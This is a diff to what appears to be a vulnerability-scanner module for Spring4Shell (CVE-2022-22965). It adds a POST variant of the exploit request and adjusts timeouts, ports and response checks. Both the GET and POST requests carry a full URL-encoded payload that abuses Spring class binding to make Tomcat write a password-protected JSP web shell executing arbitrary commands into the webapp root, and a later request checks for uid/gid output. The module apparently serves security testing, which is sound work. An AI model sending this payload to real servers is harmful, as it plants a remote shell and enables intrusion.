@@ -9,9 +9,10 @@ info:
     Spring's data-binding to reach the Tomcat Logging Valve class via the classloader
     and overwrite its properties, causing Tomcat to write an attacker-controlled JSP
     web shell to the webapp root. This module sends the crafted class-manipulation
-    request (via GET and POST vectors) and then requests the dropped marker file to confirm execution.
-    Affected versions: Spring Framework < 5.3.18, < 5.2.20 (JDK9+, Tomcat WAR deployment).
-  reference:
+    request (via GET and POST vectors) and then requests the dropped marker file to
+    confirm execution. Affected versions: Spring Framework < 5.3.18, < 5.2.20
+    (JDK9+, Tomcat WAR deployment).
+  references:
     - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
     - https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
     - https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965
@@ -39,7 +40,7 @@ payloads:
         ssl: false
         url:
           nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+            input_format: "{{schema}}://{target}:{{ports}}{url_base_path}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
             prefix: ""
             suffix: ""
             interceptors: []
@@ -52,7 +53,39 @@ payloads:
                 - 443
                 - 8080
         response:
-          save_to_temp_events_only: spring4shell_get_drop
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200|500"
+              reverse: false
+
+      - method: post
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/x-www-form-urlencoded"
+          c1: "Runtime"
+          c2: "<%"
+          suffix: "%>"
+          DNT: "1"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{url_base_path}"
+            prefix: ""
+            suffix: ""
+            interceptors: []
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8080
+        data: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+        response:
           condition_type: and
           conditions:
             status_code:
@@ -60,7 +93,7 @@ payloads:
               reverse: false
 
       - method: get
-        timeout: 10
+        timeout: 5
         headers:
           User-Agent: "{user_agent}"
         allow_redirects: false
@@ -78,10 +111,8 @@ payloads:
               ports:
                 - 80
                 - 443
-                - 3000
                 - 8080
         response:
-          dependent_on_temp_event: spring4shell_get_drop
           condition_type: and
           conditions:
             status_code:
@@ -90,4 +121,3 @@ payloads:
             content:
               regex: "(uid=[0-9]+.*gid=[0-9]+|groups=[0-9]+)"
               reverse: false
-
